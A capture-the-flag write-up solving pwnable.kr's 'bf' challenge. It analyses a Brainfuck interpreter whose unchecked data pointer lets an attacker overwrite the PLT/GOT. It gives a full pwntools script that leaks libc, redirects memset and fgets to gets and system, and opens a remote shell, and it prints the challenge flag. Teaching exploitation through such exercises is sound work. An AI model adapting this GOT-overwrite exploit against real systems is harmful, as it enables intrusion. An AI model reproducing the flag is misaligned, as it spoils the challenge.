# brain fuck

## Description

brain fuck - 150 pt

>I made a simple brain-fuck language emulation program written in C. <br>
>The [ ] commands are not implemented yet. However the rest functionality seems working fine. <br>
>Find a bug and exploit it to get a shell. <br><br>
>Download : http://pwnable.kr/bin/bf <br>
>Download : http://pwnable.kr/bin/bf_libc.so <br><br>
>Running at : nc pwnable.kr 9001

## Background

### Brainfuck

Brainfuck is a simple programming language that consists of 8 commands. It uses a simple a one-dimensional array, a movable data pointer (initialized to point to the start of the array) and two streams of bytes for input and output.

Here are the viable commands: 

|Character|Meaning|
|---------|-------|
| >| 	Increment the data pointer by one|
|<| 	Decrement the data pointer by one |
|+|Increment the byte at the data pointer by one.|
|-|Decrement the byte at the data pointer by one.|
|.|	Output the byte at the data pointer.|
|,|Accept one byte of input, storing its value in the byte at the data pointer.|

The last two commands are irrelevant to the challenge, but you are welcome to [read](https://en.wikipedia.org/wiki/Brainfuck) about them. 

## Solution

### Installation

Usualy I don't explain how to download and run the challenge, but since running it locally isn't as trivial as usual, this time I will.

after `wget`ing both the binary and the libc, in order to make the binary use the libc from the challenge, and not the one on one's computer, they may use `patchelf`, or `pwninit` (which uses `patchelf`, but does all that work for you 🙃).

### Understanding the binary

Let's take a look at the functionality of the binary, using IDA:

**main.c:**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int i; // [esp+28h] [ebp-40Ch]
  _BYTE v5[1024]; // [esp+2Ch] [ebp-408h] BYREF
  unsigned int v6; // [esp+42Ch] [ebp-8h]

  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(v5, 0, sizeof(v5));
  fgets(v5, 1024, stdin);
  for ( i = 0; i < strlen(v5); ++i )
    do_brainfuck((char)v5[i]);
  return 0;
}
```

**do_brainfuck:**
```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1 - 43;
  switch ( a1 )
  {
    case '+':
      result = p;
      ++*(_BYTE *)p;
      break;
    case ',':
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case '-':
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(char *)p);
      break;
    case '<':
      result = --p;
      break;
    case '>':
      result = ++p;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

The program saves the address where `tape`, a lable somewhere in the `bss` section, is - at `p`, another location in the `bss` section. It also creates a local buffer of length 1024 bytes, and prompts the user for 1024 bytes of input - saving them in that buffer.

Then, the program iterates through that buffer and, character by character, it sends them to the `do_brainfuck` function. This function is the heart of the program. It moves around the data pointer `p` over at `tape` and inputs/outputs data there, according to the character it got as input.

Basically, this program is a brainfuck interpreter of some sort.

### Exploit

Let's check the security features:

```bash
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8047000)
RUNPATH:  b'.'
```

The NX bit is set, and there are stack canaries. So, trying any shellcode-based exploits won't work.

Let's take a different approach: as can be seen, there's only partial RELRO - this means that we can change the PLT.

Looking at the binary using IDA's A view, it seems that the `tape` is, in fact, very close to the PLT. 

So let's do the following: 
* move `p` to point at one of the libc functions at the PLT - like `puthcar` for example.
* call the function so it's address will be loaded correctly at the PLT (lazy loading...)
* leak it using the `.` command
* update some addresses at the PLT: 
    * `putchar` --------> `main`
    * `memset` --------> `gets`
    * `fgets` --------> `system`
* call putchar by giving `.`
* give `fgets` `/bin/sh` as input

If you are wondering why should we do these redirections - recall the calls to `fgets` and `memset` in `main`:

```c
memset(v5, 0, sizeof(v5));
fgets(v5, 1024, stdin);
```

Both functions give the local buffer as the first arguments. After the redirecting of the PLT, `memset` will call `gets` - which will allow us to write to the buffer `/bin/sh`, and `fgets` will call `system` - which will execute `/bin/sh`.

**Side Note:** When I first attempted this challenge, I tried to leak the address of `memset` instead of `putchar` (not sure why). Anyhow, the exploit didn't work and I spent a couple of hours debugging. Then, I noticed that `memset`'s address was *way* off from the other libc functions - which made me realise it was probably linked from another library. 

### Exploit code

```python
from pwn import *

libc = ELF('./bf_libc.so')
conn = remote('pwnable.kr', 9001)

conn.recvuntil(b'except [ ]\n')

# Send payload
payload = '<' * 0x70 + '.' # p ---> putchar @ PLT, call putchar 
payload += '.>' * 0x4  + '<' * 0x4 # leak the address
payload += ',>' * 0x4 + '<' * 0x4 # change putchar @ PLT
payload += '<' * 0x4 + ',>' * 0x4 + '<' * 0x4 # change memset @ PLT
payload += '<' * 0x1c + ',>' * 0x4 # change fgets @ PLT
payload += '.' # call putchar

conn.sendline(payload.encode())

# Get the address of putchar
conn.recv(1)
putchar_addr = int(conn.recv(4)[::-1].hex(), 16)

# Calculate the address of gets and system
gets_addr = (putchar_addr - libc.symbols['putchar']) + libc.symbols['gets']
system_addr = (putchar_addr - libc.symbols['putchar']) + libc.symbols['system']

# Give input to perform redirections
conn.send(p32(0x08048671)) # putchar ----> main
conn.send(p32(gets_addr)) # memset ----> gets
conn.send(p32(system_addr)) # fgets ----> system

# Input for gets
conn.sendline(b'/bin/sh\x00') 

conn.interactive()
```

```bash
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
$ cat flag
BrainFuck? what a weird language..
```